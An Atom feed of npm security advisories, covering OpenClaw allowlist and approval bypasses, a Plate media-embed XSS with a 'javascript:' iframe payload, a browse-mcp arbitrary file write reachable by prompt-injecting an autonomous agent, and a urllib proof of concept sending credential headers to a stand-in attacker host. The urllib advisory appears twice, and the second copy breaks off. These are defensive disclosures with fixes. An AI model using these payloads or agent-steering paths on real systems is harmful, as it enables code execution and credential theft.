<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2026-08-25T17:21:35.158Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[openclaw] Duplicate Advisory: OpenClaw: Node pairing reconnection could confuse approval scope state]]></title>
        <id>https://github.com/advisories/GHSA-c85p-9pvr-f7f5</id>
        <link href="https://github.com/advisories/GHSA-c85p-9pvr-f7f5"/>
        <updated>2026-08-25T16:39:53.000Z</updated>
        <content type="html"><![CDATA[<h3 id="duplicate-advisory">Duplicate Advisory</h3>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-83w9-h5wv-j9xm. This link is maintained to preserve external references.</p>
<h3 id="original-description">Original Description</h3>
<p>OpenClaw before 2026.5.27 contains a state mutation vulnerability in node pairing reconnection that allows paired nodes to confuse approval scope decisions. Attackers can exploit reconnection logic to restore or present broader node authority than intended, potentially bypassing approval restrictions.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-83w9-h5wv-j9xm">https://github.com/openclaw/openclaw/security/advisories/GHSA-83w9-h5wv-j9xm</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-53838">https://nvd.nist.gov/vuln/detail/CVE-2026-53838</a></li>
<li><a href="https://www.vulncheck.com/advisories/openclaw-node-pairing-state-mutation-via-reconnection">https://www.vulncheck.com/advisories/openclaw-node-pairing-state-mutation-via-reconnection</a></li>
<li><a href="https://github.com/advisories/GHSA-c85p-9pvr-f7f5">https://github.com/advisories/GHSA-c85p-9pvr-f7f5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c85p-9pvr-f7f5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-13T00:34:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] Duplicate Advisory: OpenClaw: PowerShell encoded-command aliases could miss exec allowlist checks]]></title>
        <id>https://github.com/advisories/GHSA-ffhm-8fwq-7q27</id>
        <link href="https://github.com/advisories/GHSA-ffhm-8fwq-7q27"/>
        <updated>2026-08-25T16:39:18.000Z</updated>
        <content type="html"><![CDATA[<h3 id="duplicate-advisory">Duplicate Advisory</h3>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-j472-gf56-x589. This link is maintained to preserve external references.</p>
<h3 id="original-description">Original Description</h3>
<p>OpenClaw before 2026.5.12 contains an allowlist bypass vulnerability in PowerShell encoded-command handling that allows attackers to execute encoded commands using abbreviated flag aliases not recognized by the allowlist parser. Remote authenticated operators can bypass execution allowlist checks by using unrecognized encoded-command alias forms to execute arbitrary PowerShell content.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-j472-gf56-x589">https://github.com/openclaw/openclaw/security/advisories/GHSA-j472-gf56-x589</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-53836">https://nvd.nist.gov/vuln/detail/CVE-2026-53836</a></li>
<li><a href="https://www.vulncheck.com/advisories/openclaw-allowlist-bypass-via-powershell-encoded-command-aliases">https://www.vulncheck.com/advisories/openclaw-allowlist-bypass-via-powershell-encoded-command-aliases</a></li>
<li><a href="https://github.com/advisories/GHSA-ffhm-8fwq-7q27">https://github.com/advisories/GHSA-ffhm-8fwq-7q27</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-ffhm-8fwq-7q27</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-13T00:34:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] Duplicate Advisory: OpenClaw's POSIX node system.run safe-bin allowlist could be widened by shell expansion]]></title>
        <id>https://github.com/advisories/GHSA-gwcq-453v-2frr</id>
        <link href="https://github.com/advisories/GHSA-gwcq-453v-2frr"/>
        <updated>2026-08-25T16:38:42.000Z</updated>
        <content type="html"><![CDATA[<h3 id="duplicate-advisory">Duplicate Advisory</h3>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-mhq8-78pj-5j79. This link is maintained to preserve external references.</p>
<h3 id="original-description">Original Description</h3>
<p>OpenClaw before 2026.5.18 contains a policy enforcement vulnerability in system.run safe-bin allowlist validation that allows shell expansion to modify command interpretation on POSIX nodes. Authenticated operators can exploit shell metacharacters in approved commands to read unintended node-local files and expose sensitive configuration data.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-mhq8-78pj-5j79">https://github.com/openclaw/openclaw/security/advisories/GHSA-mhq8-78pj-5j79</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-53831">https://nvd.nist.gov/vuln/detail/CVE-2026-53831</a></li>
<li><a href="https://www.vulncheck.com/advisories/openclaw-arbitrary-file-read-via-shell-expansion-in-system-run-safe-bin-allowlist">https://www.vulncheck.com/advisories/openclaw-arbitrary-file-read-via-shell-expansion-in-system-run-safe-bin-allowlist</a></li>
<li><a href="https://github.com/advisories/GHSA-gwcq-453v-2frr">https://github.com/advisories/GHSA-gwcq-453v-2frr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gwcq-453v-2frr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-13T00:34:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@platejs/media] Plate: Media embed provider metadata can bypass URL sanitization and execute iframe JavaScript]]></title>
        <id>https://github.com/advisories/GHSA-qj6x-xx2h-8hvv</id>
        <link href="https://github.com/advisories/GHSA-qj6x-xx2h-8hvv"/>
        <updated>2026-08-25T16:29:26.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The media embed renderer trusts serialized <code>provider</code> or <code>sourceUrl</code> metadata and skips the URL protocol validation that normally blocks unsafe media embed URLs. A crafted Plate document can set a known video provider while keeping <code>url</code> as a <code>javascript:</code> iframe source. When a victim opens that document in an app using the registry media embed component, the component renders the attacker URL directly as an iframe <code>src</code>.</p>
<h2 id="impact">Impact</h2>
<p>An attacker who can create or share Plate document content with another user can execute JavaScript in the victim browser context when the victim opens the document. This can expose application data available to the page and perform actions as the victim, depending on the host application's session model.</p>
<h2 id="reproduction">Reproduction</h2>
<p>Use a Plate editor or viewer that renders media embeds with the registry <code>MediaEmbedElement</code> and load a document containing this node:</p>
<pre><code class="language-json">{
  "type": "media_embed",
  "provider": "vimeo",
  "sourceUrl": "https://vimeo.com/1",
  "url": "javascript:parent.postMessage('plate-media-xss','*')",
  "children": [{ "text": "" }]
}
</code></pre>
<p>When rendered, the node is treated as a Vimeo media embed because <code>provider</code> is present. The iframe receives the unvalidated <code>url</code> value as its <code>src</code>.</p>
<h2 id="root-cause--technical-details">Root Cause / Technical Details</h2>
<p><code>parseMediaUrl</code> is the intended hardening point for media embed URLs and rejects parser output unless the URL protocol is <code>http:</code> or <code>https:</code>. However, <code>useMediaState</code> had a fast path for serialized nodes that already contain <code>provider</code> or <code>sourceUrl</code>. That fast path returned <code>{ id, provider, sourceUrl, url }</code> directly and did not call <code>parseMediaUrl</code> or otherwise validate the stored <code>url</code>.</p>
<p>The registry <code>MediaEmbedElement</code> then checks that <code>embed.provider</code> is one of the video providers and renders non-YouTube video providers with <code>&lt;iframe src={embed.url}&gt;</code>. Because <code>provider</code> is attacker-controlled serialized document metadata, it can be set to <code>vimeo</code> while <code>url</code> remains <code>javascript:...</code>.</p>
<p>This is fixed in <code>@platejs/media</code> 53.1.4 by recomputing embed metadata from the render URL instead of trusting serialized <code>provider</code>, <code>id</code>, or <code>sourceUrl</code> metadata.</p>
<h2 id="poc-evidence">PoC Evidence</h2>
<p>A browser proof using the same data flow set an iframe <code>src</code> to:</p>
<pre><code class="language-text">javascript:parent.postMessage('plate-media-xss','*')
</code></pre>
<p>Chromium executed the iframe JavaScript and the parent page received <code>plate-media-xss</code>, confirming execution from the iframe source.</p>
<h2 id="remediation">Remediation</h2>
<p>Upgrade <code>@platejs/media</code> to 53.1.4 or later. Treat <code>provider</code>, <code>sourceUrl</code>, and <code>id</code> in serialized documents as untrusted derived metadata. Recompute embed metadata from <code>url</code> with <code>parseMediaUrl</code>, or at minimum validate any fast-path <code>url</code> with the same protocol allowlist before rendering an iframe.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/udecode/plate/security/advisories/GHSA-qj6x-xx2h-8hvv">https://github.com/udecode/plate/security/advisories/GHSA-qj6x-xx2h-8hvv</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-55596">https://nvd.nist.gov/vuln/detail/CVE-2026-55596</a></li>
<li><a href="https://github.com/udecode/plate/pull/5014">https://github.com/udecode/plate/pull/5014</a></li>
<li><a href="https://github.com/udecode/plate/commit/6214914ca811adf22d0ad503154494216eed68ba">https://github.com/udecode/plate/commit/6214914ca811adf22d0ad503154494216eed68ba</a></li>
<li><a href="https://github.com/udecode/plate/releases/tag/v53.1.4">https://github.com/udecode/plate/releases/tag/v53.1.4</a></li>
<li><a href="https://github.com/advisories/GHSA-qj6x-xx2h-8hvv">https://github.com/advisories/GHSA-qj6x-xx2h-8hvv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qj6x-xx2h-8hvv</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-25T16:29:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[browse-mcp] browse-mcp has an arbitrary file write via unconfined download and state paths]]></title>
        <id>https://github.com/advisories/GHSA-m9mq-7m7q-xc6p</id>
        <link href="https://github.com/advisories/GHSA-m9mq-7m7q-xc6p"/>
        <updated>2026-08-25T16:28:33.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><code>browser_download</code> wrote a fetched file to <code>join(save_dir, filename)</code> with no validation of <code>save_dir</code>, and <code>browser_save_state</code> / <code>browser_load_state</code> honored an explicit <code>path</code> unchanged. The MCP caller controls these arguments (a malicious MCP client, or an autonomous agent steered by indirect prompt injection on a visited page), so an attacker could supply an arbitrary <code>save_dir</code> (or state <code>path</code>) together with a URL whose response body became the file contents, writing attacker-controlled bytes to any path the process can reach (for example <code>~/.bashrc</code>, an autostart entry, or a cron file). That is an arbitrary file write that can lead to host code execution. The <code>force_fetch</code> fallback additionally used a raw <code>fetch()</code> that bypassed the <code>BROWSE_MCP_ALLOWED_ORIGINS</code> origin fence.</p>
<p>Estimated severity: CVSS 3.1 around 7.8 (High) for the local / agent-mediated case.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in 0.8.2. <code>save_dir</code> is confined under the download root (<code>~/.browse-mcp/downloads</code>) and the explicit state <code>path</code> under <code>~/.browse-mcp/state</code>; absolute paths and <code>..</code> escapes are rejected, and download filenames are reduced to a bare basename. <code>force_fetch</code> now also honors the origin fence. Data roots remain relocatable via <code>BROWSE_MCP_HOME</code>. Upgrade to browse-mcp 0.8.2.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Restrict the exposed tools with <code>BROWSE_MCP_TOOLS</code> to a set that excludes <code>browser_download</code>, <code>browser_save_state</code>, and <code>browser_load_state</code> (for example the hardened recipe in SECURITY.md). Note that the allowlist hides the tools from an agent but does not stop a malicious MCP client from calling them by name, so upgrading is the real fix.</p>
<ul>
<li>Reported privately by novice-22.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/That1Drifter/browse-mcp/security/advisories/GHSA-m9mq-7m7q-xc6p">https://github.com/That1Drifter/browse-mcp/security/advisories/GHSA-m9mq-7m7q-xc6p</a></li>
<li><a href="https://github.com/That1Drifter/browse-mcp/pull/58">https://github.com/That1Drifter/browse-mcp/pull/58</a></li>
<li><a href="https://github.com/That1Drifter/browse-mcp/commit/5352a4a56f626254b445bfa07e4bb48c5aad15c1">https://github.com/That1Drifter/browse-mcp/commit/5352a4a56f626254b445bfa07e4bb48c5aad15c1</a></li>
<li><a href="https://github.com/That1Drifter/browse-mcp/blob/v0.8.2/CHANGELOG.md#082---2026-06-13">https://github.com/That1Drifter/browse-mcp/blob/v0.8.2/CHANGELOG.md#082---2026-06-13</a></li>
<li><a href="https://github.com/That1Drifter/browse-mcp/releases/tag/v0.8.2">https://github.com/That1Drifter/browse-mcp/releases/tag/v0.8.2</a></li>
<li><a href="https://github.com/advisories/GHSA-m9mq-7m7q-xc6p">https://github.com/advisories/GHSA-m9mq-7m7q-xc6p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m9mq-7m7q-xc6p</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-25T16:28:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[urllib] urllib's cross-origin redirects preserve credential-bearing request headers, leading to potential credential leakage]]></title>
        <id>https://github.com/advisories/GHSA-hq3h-g68c-hp78</id>
        <link href="https://github.com/advisories/GHSA-hq3h-g68c-hp78"/>
        <updated>2026-08-25T16:19:34.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>urllib supports redirect-following through <code>followRedirect</code>, which is expected behavior for an HTTP client. The issue is that, when following a redirect to a <strong>different origin</strong>, urllib preserves the caller-supplied request headers verbatim, including credential-bearing headers such as <code>Authorization</code>, <code>Cookie</code>, <code>Proxy-Authorization</code>, and custom auth headers (<code>x-api-key</code>, <code>x-auth-token</code>, <code>x-access-token</code>).</p>
<p>If the redirect target is attacker-controlled or outside the trust boundary of the original target, credentials intended for the original origin can be delivered to the redirected origin. In a local multi-library reproduction, urllib v4.9.0 was the only tested client that stripped no headers on cross-origin redirect.</p>
<h2 id="affected-behavior">Affected behavior</h2>
<p>Confirmed against urllib v4.9.0. The relevant code is in <code>#requestInternal</code> (<a href="https://github.com/node-modules/urllib/blob/master/src/HttpClient.ts#L639-L656"><code>src/HttpClient.ts:639-656</code></a>):</p>
<pre><code class="language-ts">     // https://developer.mozilla.org/en-US/docs/Web/HTTP/Redirections
      if (RedirectStatusCodes.includes(res.statusCode) &amp;&amp; maxRedirects &gt; 0 &amp;&amp; requestContext.redirects &lt; maxRedirects) {
        if (res.headers.location) {
          requestContext.redirects++;
          const nextUrl = new URL(res.headers.location, requestUrl.href);
          // Ensure the response is consumed
          await response.body.arrayBuffer();
          debug(
            'Request#%d got response, status: %s, headers: %j, timing: %j, redirect to %s',
            requestId,
            res.status,
            res.headers,
            res.timing,
            nextUrl.href,
          );
          return await this.#requestInternal(nextUrl.href, options, requestContext);
        }
      }
</code></pre>
<p>The recursive call <code>this.#requestInternal(nextUrl.href, options, requestContext)</code> reuses the original <code>options</code> object. If the caller supplied credential-bearing headers in <code>options.headers</code>, those headers are reused for the redirected request, regardless of whether the redirect target shares the original origin.</p>
<h2 id="redirect-header-handling-context">Redirect-header handling context</h2>
<p>The CHANGELOG suggests that redirect-related header handling has been considered before, including changes around preserving or cleaning up <code>Host</code> during redirects. Given that context, sensitive-header stripping may be an unintentional gap rather than an explicit policy decision.</p>
<h2 id="proof-of-concept-3-container-topology">Proof of Concept: 3-container topology</h2>
<p>The reproduction uses three separate containers (<code>partner</code>, <code>attacker</code>, <code>client</code>) connected over a Podman bridge network. Each container has its own hostname, port, and process, so the redirect crosses a clear origin boundary. This is not a <code>localhost</code> vs <code>127.0.0.1</code> same-host case.</p>
<pre><code class="language-text">[client container]                       [partner container]              [attacker container]
hostname: client                         hostname: partner                hostname: attacker
                                         port: 3001                       port: 3002
   urllib v4.9.0
        │
        │ GET http://partner:3001/start
        │ + 6 credential-bearing headers
        ↓
                                         302 Location:
                                         http://attacker:3002/captured
                                                   │
                                                   │ urllib follows redirect
                                                   │ → DIFFERENT ORIGIN
                                                   │   (different hostname and port)
                                                   │ → all 6 headers preserved
                                                   ↓
                                                                          headers logged
                                                                          inside attacker
                                                                          container
</code></pre>
<p>The origin tuple is <code>(scheme, host, port)</code>:</p>
<ul>
<li>source origin: <code>http://partner:3001</code></li>
<li>destination origin: <code>http://attacker:3002</code></li>
</ul>
<p>The host and port both differ, so the redirect target is a different URL origin. The headers are logged in a separate process inside a separate container.</p>
<p><strong>Client invocation</strong> (<code>client/poc.mjs</code>):</p>
<pre><code class="language-javascript">import urllib from 'urllib' // v4.9.0

await urllib.request('http://partner:3001/start', {
  followRedirect: true,
  maxRedirects: 5,
  headers: {
    'Authorization': 'Bearer LIVE-AUTH-3CONTAINER',
    'Cookie': 'session=LIVE-COOKIE-3CONTAINER',
    'Proxy-Authorization': 'Bearer proxy-LIVE-3CONTAINER',
    'x-api-key': 'sk-LIVE-3CONTAINER-x123',
    'x-auth-token': 'auth-LIVE-3CONTAINER-y456',
    'x-access-token': 'access-LIVE-3CONTAINER-z789',
  },
})
</code></pre>
<p><strong>Observed result</strong><br>urllib 4.9.0, Node.js 22.22.2, linux/arm64:</p>
<pre><code class="language-text">[attacker] CAPTURED HEADERS:
  "authorization":       "Bearer LIVE-AUTH-3CONTAINER"
  "cookie":              "session=LIVE-COOKIE-3CONTAINER"
  "proxy-authorization": "Bearer proxy-LIVE-3CONTAINER"
  "x-api-key":           "sk-LIVE-3CONTAINER-x123"
  "x-auth-token":        "auth-LIVE-3CONTAINER-y456"
  "x-access-token":      "access-LIVE-3CONTAINER-z789"
  "user-agent":          "node-urllib/4.9.0 Node.js/22.22.2 (linux; arm64)"

LEAK RATE: 6/6
</code></pre>
<p>The <code>user-agent</code> value confirms that the redirected request was sent by urllib v4.9.0.</p>
<h2 id="independent-reproduction-multi-library-comparison">Independent reproduction: multi-library comparison</h2>
<p>A separate local harness tested the same cross-origin redirect topology against multiple Node.js HTTP clients:</p>
<ul>
<li>same <code>partner:3001 → attacker:3002</code> redirect;</li>
<li>same six credential-bearing headers;</li>
<li>same RFC 6454 origin boundary.</li>
</ul>
<p>The results were deterministic across runs:</p>
<table>
<thead>
<tr>
<th>Library</th>
<th align="right">Leak rate</th>
<th>Headers stripped on cross-origin redirect</th>
</tr>
</thead>
<tbody><tr>
<td>undici 6.21.0</td>
<td align="right">3/6</td>
<td><code>authorization</code>, <code>cookie</code>, <code>proxy-authorization</code></td>
</tr>
<tr>
<td>needle 3.5.0</td>
<td align="right">3/6</td>
<td><code>authorization</code>, <code>cookie</code>, <code>proxy-authorization</code></td>
</tr>
<tr>
<td>node-fetch 3.3.2</td>
<td align="right">4/6</td>
<td><code>authorization</code>, <code>cookie</code></td>
</tr>
<tr>
<td>superagent 10.3.0</td>
<td align="right">4/6</td>
<td><code>authorization</code>, <code>cookie</code></td>
</tr>
<tr>
<td>@hapi/wreck 18.1.0</td>
<td align="right">4/6</td>
<td><code>authorization</code>, <code>cookie</code></td>
</tr>
<tr>
<td>request 2.88.2</td>
<td align="right">5/6</td>
<td><code>authorization</code></td>
</tr>
<tr>
<td><strong>urllib 4.9.0</strong></td>
<td align="right"><strong>6/6</strong></td>
<td><strong>none</strong></td>
</tr>
</tbody></table>
<p><code>urllib</code> was the only tested library that stripped no headers on cross-origin redirect. Custom auth headers such as <code>x-api-key</code>, <code>x-auth-token</code>, and <code>x-access-token</code> are an ecosystem-wide gap in this comparison. The urllib-specific issue is the absence of any strip step for standard credential-bearing headers such as <code>Authorization</code>, <code>Cookie</code>, and <code>Proxy-Authorization</code>.</p>
<p>The reproduction harness is small and can be shared if useful.</p>
<h2 id="impact">Impact</h2>
<p>This affects Node.js applications that use urllib to make authenticated HTTP requests while allowing redirects to be followed automatically.</p>
<pre><code class="language-text">1. Application sends an authenticated request:
     GET https://api.partner.example/data
     Authorization: Bearer &lt;token&gt;
     Cookie: session=&lt;session-id&gt;

2. The partner endpoint, a compromised intermediary, or a misconfigured CDN returns:
     302 Location: https://attacker.example/captured

3. urllib follows the redirect and sends the original Authorization and Cookie headers
   to attacker.example.
</code></pre>
<p>This exposes credentials to an origin that was not the intended recipient. Depending on the credential type and server-side validation, the leaked credentials may be reusable against the original partner API or related services.</p>
<p>This requires no user interaction. Realistic triggers include compromised partner subdomains, DNS hijacking, malicious partner endpoints during onboarding, internal services redirecting across trust boundaries, or an open redirect upstream of urllib's call site.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/node-modules/urllib/security/advisories/GHSA-hq3h-g68c-hp78">https://github.com/node-modules/urllib/security/advisories/GHSA-hq3h-g68c-hp78</a></li>
<li><a href="https://github.com/node-modules/urllib/pull/812">https://github.com/node-modules/urllib/pull/812</a></li>
<li><a href="https://github.com/node-modules/urllib/pull/813">https://github.com/node-modules/urllib/pull/813</a></li>
<li><a href="https://github.com/node-modules/urllib/commit/7c86c465883ebd3dea5109c87d7bbe3b00960a16">https://github.com/node-modules/urllib/commit/7c86c465883ebd3dea5109c87d7bbe3b00960a16</a></li>
<li><a href="https://github.com/node-modules/urllib/commit/811a8d56e64e540bf6a19bf8b3737692f05d5c46">https://github.com/node-modules/urllib/commit/811a8d56e64e540bf6a19bf8b3737692f05d5c46</a></li>
<li><a href="https://github.com/node-modules/urllib/releases/tag/v2.44.1">https://github.com/node-modules/urllib/releases/tag/v2.44.1</a></li>
<li><a href="https://github.com/node-modules/urllib/releases/tag/v4.9.1">https://github.com/node-modules/urllib/releases/tag/v4.9.1</a></li>
<li><a href="https://github.com/advisories/GHSA-hq3h-g68c-hp78">https://github.com/advisories/GHSA-hq3h-g68c-hp78</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hq3h-g68c-hp78</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-25T16:19:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[urllib] urllib's cross-origin redirects preserve credential-bearing request headers, leading to potential credential leakage]]></title>
        <id>https://github.com/advisories/GHSA-hq3h-g68c-hp78</id>
        <link href="https://github.com/advisories/GHSA-hq3h-g68c-hp78"/>
        <updated>2026-08-25T16:19:34.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>urllib supports redirect-following through <code>followRedirect</code>, which is expected behavior for an HTTP client. The issue is that, when following a redirect to a <strong>different origin</strong>, urllib preserves the caller-supplied request headers verbatim, including credential-bearing headers such as <code>Authorization</code>, <code>Cookie</code>, <code>Proxy-Authorization</code>, and custom auth headers (<code>x-api-key</code>, <code>x-auth-token</code>, <code>x-access-token</code>).</p>
<p>If the redirect target is attacker-controlled or outside the trust boundary of the original target, credentials intended for the original origin can be delivered to the redirected origin. In a local multi-library reproduction, urllib v4.9.0 was the only tested client that stripped no headers on cross-origin redirect.</p>
<h2 id="affected-behavior">Affected behavior</h2>
<p>Confirmed against urllib v4.9.0. The relevant code is in <code>#requestInternal</code> (<a href="https://github.com/node-modules/urllib/blob/master/src/HttpClient.ts#L639-L656"><code>src/HttpClient.ts:639-656</code></a>):</p>
<pre><code class="language-ts">     // https://developer.mozilla.org/en-US/docs/Web/HTTP/Redirections
      if (RedirectStatusCodes.includes(res.statusCode) &amp;&amp; maxRedirects &gt; 0 &amp;&amp; requestContext.redirects &lt; maxRedirects) {
        if (res.headers.location) {
          requestContext.redirects++;
          const nextUrl = new URL(res.headers.location, requestUrl.href);
          // Ensure the response is consumed
          await response.body.arrayBuffer();
          debug(
            'Request#%d got response, status: %s, headers: %j, timing: %j, redirect to %s',
            requestId,
            res.status,
            res.headers,
            res.timing,
            nextUrl.href,
          );
          return await this.#requestInternal(nextUrl.href, options, requestContext);
        }
      }
</code></pre>
<p>The recursive call <code>this.#requestInternal(nextUrl.href, options, requestContext)</code> reuses the original <code>options</code> object. If the caller supplied credential-bearing headers in <code>options.headers</code>, those headers are reused for the redirected request, regardless of whether the redirect target shares the original origin.</p>
<h2 id="redirect-header-handling-context">Redirect-header handling context</h2>
<p>The CHANGELOG suggests that redirect-related header handling has been considered before, including changes around preserving or cleaning up <code>Host</code> during redirects. Given that context, sensitive-header stripping may be an unintentional gap rather than an explicit policy decision.</p>
<h2 id="proof-of-concept-3-container-topology">Proof of Concept: 3-container topology</h2>
<p>The reproduction uses three separate containers (<code>partner</code>, <code>attacker</code>, <code>client</code>) connected over a Podman bridge network. Each container has its own hostname, port, and process, so the redirect crosses a clear origin boundary. This is not a <code>localhost</code> vs <code>127.0.0.1</code> same-host case.</p>
<pre><code class="language-text">[client container]                       [partner container]              [attacker container]
hostname: client                         hostname: partner                hostname: attacker
                                         port: 3001                       port: 3002
   urllib v4.9.0
        │
        │ GET http://partner:3001/start
        │ + 6 credential-bearing headers
        ↓
                                         302 Location:
                                         http://attacker:3002/captured
                                                   │
                                                   │ urllib follows redirect
                                                   │ → DIFFERENT ORIGIN
                                                   │   (different hostname and port)
                                                   │ → all 6 headers preserved
                                                   ↓
                                                                          headers logged
                                                                          inside attacker
                                                                          container
</code></pre>
<p>The origin tuple is <code>(scheme, host, port)</code>:</p>
<ul>
<li>source origin: <code>http://partner:3001</code></li>
<li>destination origin: <code>http://attacker:3002</code></li>
</ul>
<p>The host and port both differ, so the redirect target is a different URL origin. The headers are logged in a separate process inside a separate container.</p>
<p><strong>Client invocation</strong> (<code>client/poc.mjs</code>):</p>
<pre><code class="language-javascript">import urllib from 'urllib' // v4.9.0

await urllib.request('http://partner:3001/start', {
  followRedirect: true,
  maxRedirects: 5,
  headers: {
    'Authorization': 'Bearer LIVE-AUTH-3CONTAINER',
    'Cookie': 'session=LIVE-COOKIE-3CONTAINER',
    'Proxy-Authorization': 'Bearer proxy-LIVE-3CONTAINER',
    'x-api-key': 'sk-LIVE-3CONTAINER-x123',
    'x-auth-token': 'auth-LIVE-3CONTAINER-y456',
    'x-access-token': 'access-LIVE-3CONTAINER-z789',
  },
})
</code></pre>
<p><strong>Observed result</strong><br>urllib 4.9.0, Node.js 22.22.2, linux/arm64:</p>
<pre><code class="language-text">[attacker] CAPTURED HEADERS:
  "authorization":       "Bearer LIVE-AUTH-3CONTAINER"
  "cookie":              "session=LIVE-COOKIE-3CONTAINER"
  "proxy-authorization": "Bearer proxy-LIVE-3CONTAINER"
  "x-api-key":           "sk-LIVE-3CONTAINER-x123"
  "x-auth-token":        "auth-LIVE-3CONTAINER-y456"
  "x-access-token":      "access-LIVE-3CONTAINER-z789"
  "user-agent":          "node-urllib/4.9.0 Node.js/22.22.2 (linux; arm64)"

LEAK RATE: 6/6
</code></pre>
<p>The <code>user-agent</code> value confirms that the redirected request was sent by urllib v4.9.0.</p>
<h2 id="independent-reproduction-multi-library-comparison">Independent reproduction: multi-library comparison</h2>
<p>A separate local harness tested the same cross-origin redirect topology against multiple Node.js HTTP clients:</p>
<ul>
<li>same <code>partner:3001 → attacker:3002</code> redirect;</li>
<li>same six credential-bearing headers;</li>
<li>same RFC 6454 origin boundary.</li>
</ul>
<p>The results were deterministic across runs:</p>
<table>
<thead>
<tr>
<th>Library</th>
<th align="right">Leak rate</th>
<th>Headers stripped on cross-origin redirect</th>
</tr>
</thead>
<tbody><tr>
<td>undici 6.21.0</td>
<td align="right">3/6</td>
<td><code>authorization</code>, <code>cookie</code>, <code>proxy-authorization</code></td>
</tr>
<tr>
<td>needle 3.5.0</td>
<td align="right">3/6</td>
<td><code>authorization</code>, <code>cookie</code>, <code>proxy-authorization</code></td>
</tr>
<tr>
<td>node-fetch 3.3.2</td>
<td align="right">4/6</td>
<td><code>authorization</code>, <code>cookie</code></td>
</tr>
<tr>
<td>superagent 10.3.0</td>
<td align="right">4/6</td>
<td><code>authorization</code>, <code>cookie</code></td>
</tr>
<tr>
<td>@hapi/wreck 18.1.0</td>
<td align="right">4/6</td>
<td><code>authorization</code>, <code>cookie</code></td>
</tr>
<tr>
<td>request 2.88.2</td>
<td align="right">5/6</td>
<td><code>authorization</code></td>
</tr>
<tr>
<td><strong>urllib 4.9.0</strong></td>
<td align="right"><strong>6/6</strong></td>
<td><strong>none</strong></td>
</tr>
</tbody></table>
<p><code>urllib</code> was the only tested library that stripped no headers on cross-origin redirect. Custom auth headers such as <code>x-api-key</code>, <code>x-auth-token</code>, and <code>x-access-token</code> are an ecosystem-wide gap in this comparison. The urllib-specific issue is the absence of any strip step for standard credential-bearing headers such as <code>Authorization</code>, <code>Cookie</code>, and <code>Proxy-Authorization</code>.</p>
<p>The reproduction harness is small and can be shared if useful.</p>
<h2 id="impact">Impact</h2>
<p>This affects Node.js applications that use urllib to make authenticated HTTP requests while allowing redirects to be followed automatically.</p>
<pre><code class="language-text">1. Application sends an authenticated request:
     GET https://api.partner.example/data
     Authorization: Bearer &lt;token&gt;
     Cookie: session=&lt;session-id&gt;

2. The partner endpoint, a compromised intermediary, or a misconfigured CDN returns:
     302 Location: https://attacker.example/captured

3. urllib follows the redirect and sends the original Authorization and Cookie headers
   to attacker.example.
</code></pre>
<p>This exposes credentials to an origin that was not the intended recipient. Depending on the credential type and server-side validation, the leaked credentials may be reusable against the original partner API or related services.</p>
